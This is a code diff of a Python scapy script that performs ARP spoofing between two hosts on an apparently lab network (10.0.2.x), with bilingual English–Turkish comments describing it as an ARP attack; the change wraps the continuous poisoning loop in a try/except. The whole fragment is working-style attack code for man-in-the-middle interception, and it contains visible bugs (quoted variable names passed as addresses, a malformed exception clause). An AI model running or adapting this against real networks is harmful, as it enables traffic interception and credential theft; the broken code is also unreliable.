@@ -17,7 +17,11 @@ def arp_poising(target_ip, poisened_ip):
     arp_scope = scapy.ARP(op=2, pdst= "target_ip", hwdst=target_mac, psrc = "poisined_ip" )#In the scapy ARP function, we make op 2 in the properties and in this way we create a response, not a request.--Scapy ARP fonksiyonunda, özelliklerde op 2 yapıyoruz ve bu şekilde bir istek değil bir yanıt oluşturuyoruz.
     scapy.send(arp_scope,verbose=False)#We send the packages created with the scapy.send function to the destinations.--Scapy.send fonksiyonu ile oluşturulan paketleri hedeflere gönderiyoruz.
 
-while True:#We don't want our arp attack to end by sending only one packet, so we put it in an infinite loop.--Arp saldırımızın sadece bir paket göndererek bitmesini istemiyoruz, bu yüzden onu sonsuz bir döngüye koyuyoruz.
-    arp_poising("10.0.2.5","10.0.2.1")
-    arp_poising("10.0.2.1", "10.0.2.5")
-    time.sleep(3)
+try:
+    while True:#We don't want our arp attack to end by sending only one packet, so we put it in an infinite loop.--Arp saldırımızın sadece bir paket göndererek bitmesini istemiyoruz, bu yüzden onu sonsuz bir döngüye koyuyoruz.
+        arp_poising("10.0.2.5","10.0.2.1")
+        arp_poising("10.0.2.1", "10.0.2.5")
+        time.sleep(3)
+except KeyboardInterrupt():
+    print("\nQuit")
+    
